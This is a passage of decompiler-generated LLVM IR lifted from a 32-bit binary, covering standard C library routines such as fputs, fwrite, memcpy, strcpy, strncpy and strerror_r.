  br i1 %v10_804b475, label %dec_label_pc_804b4a0, label %dec_label_pc_804b49b.dec_label_pc_804b49d_crit_edge

dec_label_pc_804b47d:                             ; preds = %dec_label_pc_804b467
  %v0_804b481 = call i32 @getc_unlocked()
  %v1_804b481 = trunc i32 %v0_804b481 to i8
  store i32 %v0_804b481, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_804b481, 256
  %v11_804b489 = icmp eq i32 %sext.mask, 255
  %v1_804b48c = icmp eq i1 %v11_804b489, false
  br i1 %v1_804b48c, label %dec_label_pc_804b49b, label %dec_label_pc_804b48e

dec_label_pc_804b48e:                             ; preds = %dec_label_pc_804b47d
  %v0_804b48e = load i32, i32* @ebp, align 4
  %v1_804b48e = inttoptr i32 %v0_804b48e to i8*
  %v2_804b48e = load i8, i8* %v1_804b48e, align 1
  %v3_804b48e = and i8 %v2_804b48e, 8
  %v4_804b48e = icmp eq i8 %v3_804b48e, 0
  br i1 %v4_804b48e, label %dec_label_pc_804b4a0, label %dec_label_pc_804b4a9

dec_label_pc_804b49b:                             ; preds = %dec_label_pc_804b47d
  %v3_804b496 = load i32, i32* @ebx, align 4
  %v4_804b496 = inttoptr i32 %v3_804b496 to i8*
  store i8 %v1_804b481, i8* %v4_804b496, align 1
  %v0_804b498 = load i32, i32* @ebx, align 4
  %v1_804b498 = add i32 %v0_804b498, 1
  store i32 %v1_804b498, i32* @ebx, align 4
  %v11_804b499 = icmp eq i8 %v1_804b481, 10
  br i1 %v11_804b499, label %dec_label_pc_804b4a0, label %dec_label_pc_804b49b.dec_label_pc_804b49d_crit_edge

dec_label_pc_804b49b.dec_label_pc_804b49d_crit_edge: ; preds = %dec_label_pc_804b46f, %dec_label_pc_804b49b
  %v0_804b49d.pre = load i32, i32* @esi, align 4
  %v1_804b49d = add i32 %v0_804b49d.pre, -1
  %v8_804b49d = icmp eq i32 %v1_804b49d, 0
  store i32 %v1_804b49d, i32* @esi, align 4
  %v1_804b49e = icmp eq i1 %v8_804b49d, false
  br i1 %v1_804b49e, label %dec_label_pc_804b49b.dec_label_pc_804b49d_crit_edge.dec_label_pc_804b467_crit_edge, label %dec_label_pc_804b4a0

dec_label_pc_804b49b.dec_label_pc_804b49d_crit_edge.dec_label_pc_804b467_crit_edge: ; preds = %dec_label_pc_804b49b.dec_label_pc_804b49d_crit_edge
  %v0_804b467.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804b467

dec_label_pc_804b4a0:                             ; preds = %dec_label_pc_804b49d.preheader, %dec_label_pc_804b46f, %dec_label_pc_804b49b.dec_label_pc_804b49d_crit_edge, %dec_label_pc_804b49b, %dec_label_pc_804b48e
  %v0_804b4a0 = load i32, i32* @ebx, align 4
  %v1_804b4a0 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_804b4a0, %v1_804b4a0
  br i1 %tmp23, label %dec_label_pc_804b4a4, label %dec_label_pc_804b4a9

dec_label_pc_804b4a4:                             ; preds = %dec_label_pc_804b4a0
  %v1_804b4a4 = inttoptr i32 %v0_804b4a0 to i8*
  store i8 0, i8* %v1_804b4a4, align 1
  %v0_804b4ae.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804b4ab

dec_label_pc_804b4a9:                             ; preds = %dec_label_pc_804b4a0, %dec_label_pc_804b48e, %entry
  br label %dec_label_pc_804b4ab

dec_label_pc_804b4ab:                             ; preds = %dec_label_pc_804b4a4, %dec_label_pc_804b4a9
  %v0_804b4ae = phi i32 [ %v0_804b4ae.pre, %dec_label_pc_804b4a4 ], [ 0, %dec_label_pc_804b4a9 ]
  store i32 %v0_804b4ae, i32* %eax.global-to-local, align 4
  store i32 %v0_804b44c, i32* @ebp, align 4
  ret i32 %v0_804b4ae

; uselistorder directives
  uselistorder i32 %v0_804b4ae, { 1, 0 }
  uselistorder i32 %v0_804b4a0, { 1, 0 }
  uselistorder i32 %v1_804b49d, { 1, 0 }
  uselistorder i32 %v0_804b481, { 0, 2, 1 }
  uselistorder i32 %v0_804b467, { 1, 0 }
  uselistorder label %dec_label_pc_804b4ab, { 1, 0 }
  uselistorder label %dec_label_pc_804b4a0, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804b49b.dec_label_pc_804b49d_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804b467, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804b4b8 = load i32, i32* @esi, align 4
  %v0_804b4b9 = load i32, i32* @ebx, align 4
  store i32 %v0_804b4b9, i32* %stack_var_-8, align 4
  %v4_804b4bd = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b4bd, i32* @ebx, align 4
  %v3_804b4c2 = call i32 @strlen(i8* %arg1)
  store i32 %v3_804b4c2, i32* @esi, align 4
  %v0_804b4d3 = load i32, i32* @ebx, align 4
  %v6_804b4d4 = call i32 @__GI_fwrite_unlocked(i32 %v0_804b4d3, i64 1, i32 %v3_804b4c2, i32 %arg2)
  %v1_804b4df = load i32, i32* @esi, align 4
  %v12_804b4df = icmp eq i32 %v6_804b4d4, %v1_804b4df
  %v1_804b4e1 = icmp eq i1 %v12_804b4df, false
  br i1 %v1_804b4e1, label %dec_label_pc_804b4e5, label %dec_label_pc_804b4e3

dec_label_pc_804b4e3:                             ; preds = %entry
  br label %dec_label_pc_804b4e5

dec_label_pc_804b4e5:                             ; preds = %entry, %dec_label_pc_804b4e3
  %v0_804b4e5 = phi i32 [ -1, %entry ], [ %v6_804b4d4, %dec_label_pc_804b4e3 ]
  %v2_804b4e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b4e8, i32* @ebx, align 4
  store i32 %v0_804b4b8, i32* @esi, align 4
  ret i32 %v0_804b4e5

; uselistorder directives
  uselistorder i32 %v6_804b4d4, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b4e5, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804b4ec = load i32, i32* @edi, align 4
  %v0_804b4ed = load i32, i32* @esi, align 4
  %v0_804b4ee = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804b4f3 = trunc i64 %arg2 to i32
  store i32 %v4_804b4f3, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804b4fb = inttoptr i32 %arg4 to i16*
  %v2_804b4fb = load i16, i16* %v1_804b4fb, align 2
  %v1_804b4fe = and i16 %v2_804b4fb, 192
  %v6_804b503 = icmp eq i16 %v1_804b4fe, 192
  br i1 %v6_804b503, label %dec_label_pc_804b51e, label %dec_label_pc_804b50a

dec_label_pc_804b50a:                             ; preds = %entry
  %v0_804b50a = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_804b512 = call i32 @__stdio_trans2w_o(i16* %v1_804b4fb, i32 128, i32 %v0_804b50a, i32 %v0_804b50a, i32 %v0_804b4ee, i32 %v0_804b4ed, i32 %v0_804b4ec)
  %v1_804b51a = icmp eq i32 %v9_804b512, 0
  %v1_804b51c = icmp eq i1 %v1_804b51a, false
  br i1 %v1_804b51c, label %dec_label_pc_804b55a, label %dec_label_pc_804b51e

dec_label_pc_804b51e:                             ; preds = %dec_label_pc_804b50a, %entry
  %v2_804b51e = icmp eq i32 %v4_804b4f3, 0
  br i1 %v2_804b51e, label %dec_label_pc_804b55a, label %dec_label_pc_804b522

dec_label_pc_804b522:                             ; preds = %dec_label_pc_804b51e
  %v1_804b522 = icmp eq i32 %arg3, 0
  br i1 %v1_804b522, label %dec_label_pc_804b55a, label %dec_label_pc_804b526

dec_label_pc_804b526:                             ; preds = %dec_label_pc_804b522
  %v9_804b52b = udiv i64 4294967295, %arg2
  %v10_804b52b = trunc i64 %v9_804b52b to i32
  %v6_804b52f = icmp ult i32 %v10_804b52b, %arg3
  br i1 %v6_804b52f, label %dec_label_pc_804b54b, label %dec_label_pc_804b531

dec_label_pc_804b531:                             ; preds = %dec_label_pc_804b526
  %sext = mul i64 %arg2, 4294967296
  %v2_804b534 = sdiv i64 %sext, 4294967296
  %v3_804b534 = sext i32 %arg3 to i64
  %v4_804b534 = mul nsw i64 %v3_804b534, %v2_804b534
  %v5_804b534 = trunc i64 %v4_804b534 to i32
  %v0_804b537 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804b53d = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_804b534, i32 %v0_804b537, i32 %v10_804b52b)
  %v6_804b53d = sext i32 %v5_804b53d to i64
  %v10_804b544 = udiv i64 %v6_804b53d, %arg2
  %v11_804b544 = trunc i64 %v10_804b544 to i32
  br label %dec_label_pc_804b55c

dec_label_pc_804b54b:                             ; preds = %dec_label_pc_804b526
  %v0_804b54b = load i32, i32* @ebx, align 4
  %v1_804b54b = inttoptr i32 %v0_804b54b to i16*
  %v2_804b54b = load i16, i16* %v1_804b54b, align 2
  %v3_804b54b = or i16 %v2_804b54b, 8
  store i16 %v3_804b54b, i16* %v1_804b54b, align 2
  %v0_804b54f = load i32, i32* %stack_var_-28, align 4
  %v1_804b54f = call i32 @__errno_location(i32 %v0_804b54f)
  %v1_804b554 = inttoptr i32 %v1_804b54f to i32*
  store i32 22, i32* %v1_804b554, align 4
  br label %dec_label_pc_804b55a

dec_label_pc_804b55a:                             ; preds = %dec_label_pc_804b522, %dec_label_pc_804b51e, %dec_label_pc_804b50a, %dec_label_pc_804b54b
  br label %dec_label_pc_804b55c

dec_label_pc_804b55c:                             ; preds = %dec_label_pc_804b531, %dec_label_pc_804b55a
  %v0_804b55f = phi i32 [ %v11_804b544, %dec_label_pc_804b531 ], [ 0, %dec_label_pc_804b55a ]
  store i32 %v0_804b4ed, i32* @esi, align 4
  store i32 %v0_804b4ec, i32* @edi, align 4
  ret i32 %v0_804b55f

; uselistorder directives
  uselistorder i32 %v0_804b50a, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 0, 1, 6, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b55c, { 1, 0 }
  uselistorder label %dec_label_pc_804b55a, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b561 = load i32, i32* @esi, align 4
  store i32 %v0_804b561, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804b562 = sdiv i32 %sext, 16777216
  store i32 %v4_804b562, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804b56c = ptrtoint i16* %arg1 to i32
  store i32 %v4_804b56c, i32* %edi.global-to-local, align 4
  %v2_804b570 = udiv i32 %v4_804b562, 4
  %v3_804b573 = inttoptr i32 %arg2 to i8*
  %v4_804b573 = bitcast i16* %arg1 to i8*
  %v5_804b573 = call i8* @_memcpy(i8* %v4_804b573, i8* %v3_804b573, i32 %v2_804b570)
  %v6_804b573 = ptrtoint i8* %v5_804b573 to i32
  store i32 %v6_804b573, i32* @ecx, align 4
  %v0_804b575 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b575 = and i32 %v0_804b575, 2
  %v3_804b575 = icmp eq i32 %v2_804b575, 0
  br i1 %v3_804b575, label %dec_label_pc_804b57b, label %dec_label_pc_804b579

dec_label_pc_804b579:                             ; preds = %entry
  %v0_804b579 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b579 = inttoptr i32 %v0_804b579 to i16*
  %v2_804b579 = load i16, i16* %v1_804b579, align 2
  %v3_804b579 = load i32, i32* %edi.global-to-local, align 4
  %v4_804b579 = inttoptr i32 %v3_804b579 to i16*
  store i16 %v2_804b579, i16* %v4_804b579, align 2
  %v5_804b579 = load i32, i32* %edi.global-to-local, align 4
  %v6_804b579 = load i32, i32* %esi.global-to-local, align 4
  %v7_804b579 = load i1, i1* @df, align 1
  %v8_804b579 = select i1 %v7_804b579, i32 -2, i32 2
  %v9_804b579 = add i32 %v8_804b579, %v5_804b579
  %v10_804b579 = add i32 %v8_804b579, %v6_804b579
  store i32 %v9_804b579, i32* %edi.global-to-local, align 4
  store i32 %v10_804b579, i32* %esi.global-to-local, align 4
  %v0_804b57b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b57b

dec_label_pc_804b57b:                             ; preds = %entry, %dec_label_pc_804b579
  %v0_804b57b = phi i32 [ %v0_804b575, %entry ], [ %v0_804b57b.pre, %dec_label_pc_804b579 ]
  %v2_804b57b = urem i32 %v0_804b57b, 2
  %v3_804b57b = icmp eq i32 %v2_804b57b, 0
  br i1 %v3_804b57b, label %dec_label_pc_804b580, label %dec_label_pc_804b57f

dec_label_pc_804b57f:                             ; preds = %dec_label_pc_804b57b
  %v0_804b57f = load i32, i32* %esi.global-to-local, align 4
  %v1_804b57f = inttoptr i32 %v0_804b57f to i8*
  %v2_804b57f = load i8, i8* %v1_804b57f, align 1
  %v3_804b57f = load i32, i32* %edi.global-to-local, align 4
  %v4_804b57f = inttoptr i32 %v3_804b57f to i8*
  store i8 %v2_804b57f, i8* %v4_804b57f, align 1
  %v5_804b57f = load i32, i32* %edi.global-to-local, align 4
  %v6_804b57f = load i32, i32* %esi.global-to-local, align 4
  %v7_804b57f = load i1, i1* @df, align 1
  %v8_804b57f = select i1 %v7_804b57f, i32 -1, i32 1
  %v9_804b57f = add i32 %v8_804b57f, %v5_804b57f
  %v10_804b57f = add i32 %v8_804b57f, %v6_804b57f
  store i32 %v9_804b57f, i32* %edi.global-to-local, align 4
  store i32 %v10_804b57f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b580

dec_label_pc_804b580:                             ; preds = %dec_label_pc_804b57b, %dec_label_pc_804b57f
  store i32 %v4_804b56c, i32* %eax.global-to-local, align 4
  %v2_804b584 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b584, i32* @esi, align 4
  ret i32 %v4_804b56c

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804b580, { 1, 0 }
  uselistorder label %dec_label_pc_804b57b, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804b588 = load i32, i32* @edi, align 4
  %v4_804b591 = ptrtoint i8* %arg1 to i32
  %v5_804b595 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804b595 = ptrtoint i8* %v5_804b595 to i32
  store i32 %v6_804b595, i32* @ecx, align 4
  store i32 %v0_804b588, i32* @edi, align 4
  ret i32 %v4_804b591

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b5a1 = load i32, i32* @esi, align 4
  store i32 %v0_804b5a1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_804b5ab = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b5ab, i32* %edi.global-to-local, align 4
  %v3_804b5af = call i32 @_strlen(i8* %arg1)
  %v2_804b5b1 = add i32 %v4_804b5ab, -1
  store i32 %v2_804b5b1, i32* %edi.global-to-local, align 4
  %v8_804b5b2.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804b5b2

dec_label_pc_804b5b2:                             ; preds = %dec_label_pc_804b5b2, %entry
  %v2_804b5b3 = phi i32 [ %v7_804b5b3, %dec_label_pc_804b5b2 ], [ %v2_804b5b1, %entry ]
  %v8_804b5b2 = phi i1 [ %v5_804b5b3, %dec_label_pc_804b5b2 ], [ %v8_804b5b2.pre, %entry ]
  %v4_804b5b2 = phi i32 [ %v0_804b5b4, %dec_label_pc_804b5b2 ], [ 0, %entry ]
  %v0_804b5b2 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b5b2 = inttoptr i32 %v0_804b5b2 to i8*
  %v2_804b5b2 = load i8, i8* %v1_804b5b2, align 1
  %v3_804b5b2 = zext i8 %v2_804b5b2 to i32
  %v5_804b5b2 = and i32 %v4_804b5b2, -256
  %v6_804b5b2 = or i32 %v3_804b5b2, %v5_804b5b2
  store i32 %v6_804b5b2, i32* %eax.global-to-local, align 4
  %v9_804b5b2 = select i1 %v8_804b5b2, i32 -1, i32 1
  %v10_804b5b2 = add i32 %v0_804b5b2, %v9_804b5b2
  store i32 %v10_804b5b2, i32* %esi.global-to-local, align 4
  %v3_804b5b3 = inttoptr i32 %v2_804b5b3 to i8*
  store i8 %v2_804b5b2, i8* %v3_804b5b3, align 1
  %v4_804b5b3 = load i32, i32* %edi.global-to-local, align 4
  %v5_804b5b3 = load i1, i1* @df, align 1
  %v6_804b5b3 = select i1 %v5_804b5b3, i32 -1, i32 1
  %v7_804b5b3 = add i32 %v6_804b5b3, %v4_804b5b3
  store i32 %v7_804b5b3, i32* %edi.global-to-local, align 4
  %v0_804b5b4 = load i32, i32* %eax.global-to-local, align 4
  %v3_804b5b4 = trunc i32 %v0_804b5b4 to i8
  %v4_804b5b4 = icmp eq i8 %v3_804b5b4, 0
  %v1_804b5b6 = icmp eq i1 %v4_804b5b4, false
  br i1 %v1_804b5b6, label %dec_label_pc_804b5b2, label %dec_label_pc_804b5b8

dec_label_pc_804b5b8:                             ; preds = %dec_label_pc_804b5b2
  store i32 %v4_804b5ab, i32* %eax.global-to-local, align 4
  %v2_804b5bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b5bc, i32* @esi, align 4
  ret i32 %v4_804b5ab

; uselistorder directives
  uselistorder i32 %v0_804b5b4, { 1, 0 }
  uselistorder i32 %v7_804b5b3, { 1, 0 }
  uselistorder i1 %v5_804b5b3, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b5c1 = load i32, i32* @esi, align 4
  store i32 %v0_804b5c1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804b5c9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b5c9, i32* %edi.global-to-local, align 4
  %v4_804b5cd.pre = load i32, i32* @eax, align 4
  %v8_804b5cd.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804b5cd

dec_label_pc_804b5cd:                             ; preds = %dec_label_pc_804b5cd.dec_label_pc_804b5cd_crit_edge, %entry
  %v2_804b5ce = phi i32 [ %v7_804b5ce, %dec_label_pc_804b5cd.dec_label_pc_804b5cd_crit_edge ], [ %v4_804b5c9, %entry ]
  %v8_804b5cd = phi i1 [ %v5_804b5ce, %dec_label_pc_804b5cd.dec_label_pc_804b5cd_crit_edge ], [ %v8_804b5cd.pre, %entry ]
  %v4_804b5cd = phi i32 [ %v0_804b5cf, %dec_label_pc_804b5cd.dec_label_pc_804b5cd_crit_edge ], [ %v4_804b5cd.pre, %entry ]
  %v7_804b5cd = phi i32 [ %v0_804b5cd.pre, %dec_label_pc_804b5cd.dec_label_pc_804b5cd_crit_edge ], [ %arg2, %entry ]
  %v1_804b5cd = inttoptr i32 %v7_804b5cd to i8*
  %v2_804b5cd = load i8, i8* %v1_804b5cd, align 1
  %v3_804b5cd = zext i8 %v2_804b5cd to i32
  %v5_804b5cd = and i32 %v4_804b5cd, -256
  %v6_804b5cd = or i32 %v3_804b5cd, %v5_804b5cd
  store i32 %v6_804b5cd, i32* %eax.global-to-local, align 4
  %v9_804b5cd = select i1 %v8_804b5cd, i32 -1, i32 1
  %v10_804b5cd = add i32 %v7_804b5cd, %v9_804b5cd
  store i32 %v10_804b5cd, i32* %esi.global-to-local, align 4
  %v3_804b5ce = inttoptr i32 %v2_804b5ce to i8*
  store i8 %v2_804b5cd, i8* %v3_804b5ce, align 1
  %v4_804b5ce = load i32, i32* %edi.global-to-local, align 4
  %v5_804b5ce = load i1, i1* @df, align 1
  %v6_804b5ce = select i1 %v5_804b5ce, i32 -1, i32 1
  %v7_804b5ce = add i32 %v6_804b5ce, %v4_804b5ce
  store i32 %v7_804b5ce, i32* %edi.global-to-local, align 4
  %v0_804b5cf = load i32, i32* %eax.global-to-local, align 4
  %v3_804b5cf = trunc i32 %v0_804b5cf to i8
  %v4_804b5cf = icmp eq i8 %v3_804b5cf, 0
  %v1_804b5d1 = icmp eq i1 %v4_804b5cf, false
  br i1 %v1_804b5d1, label %dec_label_pc_804b5cd.dec_label_pc_804b5cd_crit_edge, label %dec_label_pc_804b5d3

dec_label_pc_804b5cd.dec_label_pc_804b5cd_crit_edge: ; preds = %dec_label_pc_804b5cd
  %v0_804b5cd.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b5cd

dec_label_pc_804b5d3:                             ; preds = %dec_label_pc_804b5cd
  store i32 %v4_804b5c9, i32* %eax.global-to-local, align 4
  %v2_804b5d7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b5d7, i32* @edx, align 4
  %v2_804b5d8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b5d8, i32* @esi, align 4
  ret i32 %v4_804b5c9

; uselistorder directives
  uselistorder i32 %v0_804b5cf, { 1, 0 }
  uselistorder i32 %v7_804b5ce, { 1, 0 }
  uselistorder i1 %v5_804b5ce, { 1, 0 }
  uselistorder i32 %v4_804b5c9, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b5f1 = load i32, i32* @esi, align 4
  store i32 %v0_804b5f1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804b5fd = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b5fd, i32* %edi.global-to-local, align 4
  %v1_804b601 = add i32 %arg3, 1
  store i32 %v1_804b601, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804b602

dec_label_pc_804b602:                             ; preds = %dec_label_pc_804b605, %entry
  %v3_804b606 = phi i32 [ %v4_804b5fd, %entry ], [ %v8_804b606, %dec_label_pc_804b605 ]
  %v0_804b602 = phi i32 [ %v1_804b601, %entry ], [ %v0_804b602.pre, %dec_label_pc_804b605 ]
  %v1_804b602 = add i32 %v0_804b602, -1
  %v8_804b602 = icmp eq i32 %v1_804b602, 0
  store i32 %v1_804b602, i32* %ecx.global-to-local, align 4
  br i1 %v8_804b602, label %.loopexit, label %dec_label_pc_804b605

dec_label_pc_804b605:                             ; preds = %dec_label_pc_804b602
  %v0_804b605 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b605 = inttoptr i32 %v0_804b605 to i8*
  %v2_804b605 = load i8, i8* %v1_804b605, align 1
  %v10_804b605 = load i1, i1* @df, align 1
  %v11_804b605 = select i1 %v10_804b605, i32 -1, i32 1
  %v12_804b605 = add i32 %v11_804b605, %v0_804b605
  store i32 %v12_804b605, i32* %esi.global-to-local, align 4
  %v4_804b606 = inttoptr i32 %v3_804b606 to i8*
  store i8 %v2_804b605, i8* %v4_804b606, align 1
  %v5_804b606 = load i32, i32* %edi.global-to-local, align 4
  %v6_804b606 = load i1, i1* @df, align 1
  %v7_804b606 = select i1 %v6_804b606, i32 -1, i32 1
  %v8_804b606 = add i32 %v7_804b606, %v5_804b606
  store i32 %v8_804b606, i32* %edi.global-to-local, align 4
  %v6_804b607 = icmp eq i8 %v2_804b605, 0
  %v1_804b609 = icmp eq i1 %v6_804b607, false
  %v0_804b602.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804b609, label %dec_label_pc_804b602, label %dec_label_pc_804b60b

dec_label_pc_804b60b:                             ; preds = %dec_label_pc_804b605
  %v1_804b60b = add i32 %v0_804b602.pre, -1
  store i32 %v1_804b60b, i32* %ecx.global-to-local, align 4
  %v2_804b60c = sext i8 %v2_804b605 to i32
  %v4_804b60c = inttoptr i32 %v8_804b606 to i8*
  %v5_804b60c = call i8* @_memset(i8* %v4_804b60c, i32 %v2_804b60c, i32 %v1_804b60b)
  %v6_804b60c = ptrtoint i8* %v5_804b60c to i32
  store i32 %v6_804b60c, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804b602, %dec_label_pc_804b60b
  %v2_804b612 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b612, i32* @edx, align 4
  %v2_804b613 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b613, i32* @esi, align 4
  ret i32 %v4_804b5fd

; uselistorder directives
  uselistorder i32 %v8_804b606, { 0, 2, 1 }
  uselistorder i8 %v2_804b605, { 0, 2, 1 }
  uselistorder i32 %v1_804b602, { 1, 0 }
  uselistorder i32 %v4_804b5fd, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_804b618 = ptrtoint i8* %tmp4 to i32
  %v8_804b62b5 = icmp eq i32 %tmp, 0
  %v1_804b62c6 = icmp eq i1 %v8_804b62b5, false
  br i1 %v1_804b62c6, label %dec_label_pc_804b625, label %dec_label_pc_804b62e

dec_label_pc_804b625:                             ; preds = %entry, %dec_label_pc_804b62a
  %v1_804b62b8 = phi i32 [ %v1_804b62b, %dec_label_pc_804b62a ], [ %tmp, %entry ]
  %v0_804b62e7 = phi i32 [ %v1_804b62a, %dec_label_pc_804b62a ], [ %v4_804b618, %entry ]
  %v1_804b625 = inttoptr i32 %v0_804b62e7 to i8*
  %v2_804b625 = load i8, i8* %v1_804b625, align 1
  %v3_804b625 = icmp eq i8 %v2_804b625, 0
  br i1 %v3_804b625, label %dec_label_pc_804b62e, label %dec_label_pc_804b62a

dec_label_pc_804b62a:                             ; preds = %dec_label_pc_804b625
  %v1_804b62a = add i32 %v0_804b62e7, 1
  %v1_804b62b = add i32 %v1_804b62b8, -1
  %v8_804b62b = icmp eq i32 %v1_804b62b, 0
  %v1_804b62c = icmp eq i1 %v8_804b62b, false
  br i1 %v1_804b62c, label %dec_label_pc_804b625, label %dec_label_pc_804b62e

dec_label_pc_804b62e:                             ; preds = %dec_label_pc_804b62a, %dec_label_pc_804b625, %entry
  %v0_804b62e.lcssa = phi i32 [ %v4_804b618, %entry ], [ %v0_804b62e7, %dec_label_pc_804b625 ], [ %v1_804b62a, %dec_label_pc_804b62a ]
  %v2_804b62e = sub i32 %v0_804b62e.lcssa, %v4_804b618
  ret i32 %v2_804b62e

; uselistorder directives
  uselistorder i32 %v1_804b62b, { 1, 0 }
  uselistorder i32 %v0_804b62e7, { 0, 2, 1 }
  uselistorder i32 %v4_804b618, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b625, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804b645 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804b64a = load i32, i32* @ebx, align 4
  ret i32 %v0_804b64a
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804b666 = icmp ugt i32 %arg1, 124
  br i1 %v6_804b666, label %dec_label_pc_804b683, label %dec_label_pc_804b668

dec_label_pc_804b668:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8051680.332 to i32), i32* @esi, align 4
  %v1_804b6784 = icmp eq i32 %arg1, 0
  %v1_804b67a11 = icmp eq i1 %v1_804b6784, false
  br i1 %v1_804b67a11, label %dec_label_pc_804b671, label %dec_label_pc_804b67c

dec_label_pc_804b671:                             ; preds = %dec_label_pc_804b668, %dec_label_pc_804b671
  %v0_804b674 = phi i32 [ %v3_804b674, %dec_label_pc_804b671 ], [ %arg1, %dec_label_pc_804b668 ]
  %v0_804b677 = phi i32 [ %v1_804b677, %dec_label_pc_804b671 ], [ ptrtoint ([8 x i8]* @global_var_8051680.332 to i32), %dec_label_pc_804b668 ]
